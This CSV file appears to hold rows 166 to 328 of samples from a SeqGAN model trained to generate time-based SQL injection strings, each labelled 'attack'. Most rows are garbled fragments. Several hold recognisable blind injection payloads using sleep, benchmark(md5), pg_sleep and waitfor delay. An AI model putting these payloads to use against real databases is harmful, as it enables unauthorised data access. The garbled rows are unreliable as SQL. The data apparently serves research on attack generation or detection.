label,payload,family,payload_type,method,run_id,sample_index
attack,1 where,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,166
attack,"1hvo""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,167
attack,1%'  =  'uor(,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,168
attack,ft    vt rz h  a y e,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,169
attack,ct y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,170
attack,dktfstuv,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,171
attack,"1"" or where 6967  =  select 8514  )    yq  select * (5  (  select 1915  =  5 6793",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,172
attack,1r,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,173
attack,nhiojkwhere  select delay1915q)  '%'  3114 s   y a pe    where pg_sleep 8594 *)    s where 7305  =  (  1132  )    )   andq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,174
attack,"1'  )   waitfor delay ''   )    )     )   waitfor delay '""  =  "" dhjbinyp:'0:0:2'e'  =  'wq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,175
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'b%6zpci:0!waitforz
n7196tout     t",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,176
attack,1j ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,177
attack,bhfy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,178
attack,"1"" Z' and    (    (     (  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,179
attack,"1"" 6793a",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,180
attack,"1'    )' ""  and",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,181
attack,"1'0x544d5a4cuv"" like ""--",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,182
attack,1 sleep  5   )    r where,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,183
attack,  (selectzy'fegp'n,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,184
attack,1%%wotyoaik/ or from 6967  r  6272  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,185
attack,"1""  select 6793 e",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,186
attack,  v'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,187
attack,1'  sslpt)zca nf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,188
attack,"1'  )   waitfor delay 'z%M' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pCeb",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,189
attack,  benchmark  v    )    and where and 8466  =    rl,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,190
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hpik6969pb0x6d457153nhf'  =  'f pdqsiiselect 4683 sleep  select #)    wz,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,191
attack,1'  )   waitfor delay ''hrta'+'aaw,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,192
attack,"1%""   r emtd5and    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,193
attack,1' and e sleep  select --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,194
attack,h>1'h)dao   %'  =  '0likeltl,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,195
attack,' jviz%oofvl'||  (  select 'c  =  y y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,196
attack,   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,197
attack,b'   )    )     )   and sleep  (  5  )   and    (    (     (  '' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'jnhfNin,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,198
attack,"1"" where =  (  =  select 1679 from   )  5874  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,199
attack,"1n%in"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""k  d",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,200
attack,"""uvzc""(dand  (  benchmark    )   )   andayq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,201
attack,f'  )   waitfor delay '--uzcsie,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,202
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  't'  =  'bh1%'  =  'h,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,203
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '"" where ,mdddk'   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,204
attack,"1%""hhp",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,205
attack,1'r from wheremkH    y (  =    =o  (    sleep  1132,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,206
attack,12044'favpzik)  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,207
attack,"1"" or 8667 and 'fegp'  '   h",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,208
attack,10x76555642 pg_sleeplein'  =  ''  =  'zr zjdk  = --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,209
attack,1   )    )    aspdli    all,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,210
attack,1nllh'  )   waitfor delay ''  =  'zzhy'  =  'n,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,211
attack,waitfor'wyvx'  (  'vt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,212
attack,"1""  )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,213
attack,1'  )   waitfor delay '3824p    5    and,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,214
attack,h7196pt'  =  'f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,215
attack,  select where    (   }=    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,216
attack,1    where 8667  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,217
attack,1 where from   and 6793  v,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,218
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'and",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,219
attack,"1  0x544d5a4c   )    )    aslbohshp' and    (    (     (  'fzz       )    )    and ""  =  "" where or 7305dn'  =  'kf'  =  ' fromf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,220
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ''  =  'qhnpik",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,221
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ''  =  'z,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,222
attack,benchmark  s1  sha'  )   waitfor delay ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,223
attack,1'   )     )   awhere (d)    st   sleep  select (n,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,224
attack,"1 6793,5     andy and j8594m",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,225
attack,"1"" f' like '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,226
attack,"1""      8""li0x694a4745n%1%%c",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,227
attack,1%z,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,228
attack,1d5dzmoafph'  =  'tt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,229
attack,"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'gkno  5    azyqcyyz yvpt",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,230
attack,1%2388:0:benchmarkl0b     pznhfhz ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,231
attack,1    a      )    and    <>   a)    )    --y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,232
attack,1lt fay,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,233
attack,1m  t 1679aeiahz,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,234
attack,"1b""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,235
attack,ot,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,236
attack,  'hv'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,237
attack,n'   )    )     )   and sleep  (  5  )   and    (    (     (  'fuoiobselect,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,238
attack,"1'vw""   )    )    rlike sleep  (  5  )   and    (    (   ""pandfy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,239
attack,  #   )    a sleepch,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,240
attack,"     )   '%' where delay,m 6793  =    --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,241
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""lh'  =  'r'",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,242
attack,"fvnzyya"" like ""z",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,243
attack,1%%yyahw'  =  'p|puf    jF(r (  select *(  (  and,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,244
attack,n'  =  '',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,245
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '<>'",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,246
attack,1'mi'  =  'ninw:0u'  =  'h,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,247
attack,kand where %t  (    sleep  (  o 'rnzp't 'hrta'  sleep  5   )  select or(    )    )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,248
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""w'  =  '00:ys  1915'  =  'zjho",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,249
attack,"1'  r)    and and ,m",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,250
attack,1%' and    (    (     (  'fap,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,251
attack,1%%%+h  sleeprya,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,252
attack,"0:0::  ""%""'||  (  select 'inozjj""   )    )    rlike sleep  (  5  )   and    (    (   ""' and   (  '1%bg  05  vn  s%v%hl",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,253
attack,kmq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,254
attack,1'    #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,255
attack,"1%%"" like ""%'   )    )     )   and sleep  (  5  )   and    (    (     (  '3824pbihb6866  (  )    )r  where)    )       select '  (fzq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,256
attack,ike'   and q     2388 e   (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,257
attack,"  5  vaoo1132' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'hiqw  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,258
attack,1 8594  sleep    -- ' and   (  '5  =   --c,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,259
attack,"1%'  =  '0x544d5a4cahzfw0:0:5""   )    )    rlike sleep  (  5  )   and    (    (   ""%U",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,260
attack,1%%'   )    )     )   and sleep  (  5  )   and    (    (     (  ''  =  'r  '  )    and where 6793,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,261
attack,"1vb'' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,262
attack,"select ,mi1%'   )    )     )   waitfor delay 'kohw0'  =  'nphqn'wyvx'",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,263
attack,1%is1 8507=tf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,264
attack,1  =  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,265
attack,"z""%""p",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,266
attack,liy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,267
attack,1       yand     aq5    )    rtz,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,268
attack,1'  =  '  oinp'  =  'z0  mawqpky,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,269
attack,1' av,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,270
attack,1'  )   )    # and   asro  e and 8594du  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,271
attack,""" 7196' and   (  'c",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,272
attack,  3114and   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,273
attack,1%r6f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,274
attack,1 or 6175lzt   )    'ya f  l,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,275
attack,1%'+  (  select '0dpy   pif)  )    a)    ryh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,276
attack,"1f or 6793  select pg_sleep  =      (  )  selectlwvpze""   )    )    rlike sleep  (  5  )   and    (    (   ""hjoltrm f",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,277
attack,  =  select 2044 a xiddili e 8514 sleep  sleep  #ltapyy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,278
attack,1' * or *(  0x544d5a4c    r 'wyvx'  benchmark  ''  =  '    rlzo,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,279
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '0:0:=  select   y  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,280
attack,1select    benchmark,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,281
attack,1   )    ) 8514  mddk05ikew,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,282
attack,"selectf 'wyvx'    )    s' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'fs",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,283
attack,1%wb     )-tr,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,284
attack,1%' where,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,285
attack,5q,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,286
attack,"1"" <> U8594",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,287
attack,z'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,288
attack,dbbet,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,289
attack,1 * benchmark  0x4c4d6142mdp5,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,290
attack,"1%"" like ""'  =  'k2388jb5874",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,291
attack,1h'   fhz,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,292
attack,1'+  (  select 'qike   )    and,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,293
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'x   and sleep  0x76555642 aslhhwyy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,294
attack,"1%""    2388zw)  v'  =  'i(      )    a'  =  'ht or",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,295
attack, where pg_sleep  =    andlikaawpyzpac,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,296
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'z ,'  vy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,297
attack,"1'a'  =  '""zwqj",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,298
attack,1%:(f'  =  'w,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,299
attack,"d1568vft ' and elt  (  1210  =  1210,sleep  (  5   )    )    and ''   )    )     )   and sleep  (  5  )   and    (    (     (  'ora",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,300
attack,1 where F)   andz   and   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,301
attack,"1%'""    ywaj'  =  'hvznrhptiqfvw",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,302
attack,"1""  5    and X2239     )  )     )    )    --i'  =  ''  =  'ya",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,303
attack,    select >qselect 6969  j  3114  --) --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,304
attack,1't  select   and)    )    )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,305
attack,1   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,306
attack,1'   )  5874  )    )    and)    )    )    )    and Us,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,307
attack,1'ho   rminnn0k7279,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,308
attack,"""hs   a'  =  ''  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,309
attack,"select where benchmark  m:benchmark  select from ""  3114 y sleep  benchmark  select  'w     4240lkff# where    (    sdie (   )   )    (   )    #l",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,310
attack,"1ddnipe' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'z'  =  '%' like '5'  =  ' bhhhz",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,311
attack,1%T:ph ' and   (  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,312
attack,  =  0z  spefson'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,313
attack,"1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'c"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""'  =  '0x76555642   delay   (  8252 'ywhere sleep  5000000,md  =     2388 5874  =  select where and  )    andselect echany",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,314
attack,f_'  =  'fnvz,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,315
attack,11'   )    )     )   and sleep  (  5  )   and    (    (     (  't<>:ikwhere pg_sleep  =  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,316
attack,  5    and,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,317
attack,1%p''  =  'f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,318
attack,"1   and --   ""zlal""    r  o  )    )     a",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,319
attack,"1%'  =  'f ajf where and 6793 e fromwhere sleep    f 6793 el""   pioe"" like ""phfvzhwel",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,320
attack,1,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,321
attack,    (  =  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,322
attack,:0:q and    a#,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,323
attack,sleep  s,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,324
attack,"1""  )    )    )     asin lih  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,325
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""h --peslliu",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,326
attack,1%'  x,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,327
attack,"1""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,328
